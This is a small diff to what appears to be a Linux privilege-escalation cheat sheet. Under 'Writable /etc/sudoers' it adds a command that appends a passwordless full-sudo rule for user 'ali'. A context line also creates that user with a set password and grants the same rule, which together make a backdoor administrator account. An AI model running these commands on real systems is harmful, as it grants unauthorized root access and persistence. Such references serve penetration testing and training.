@@ -154,6 +154,7 @@ su <username> ( Switch to new root user )
 ```
 ### Writable /etc/sudoers ✡️
 ```bash
+echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
 useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
 ```
 
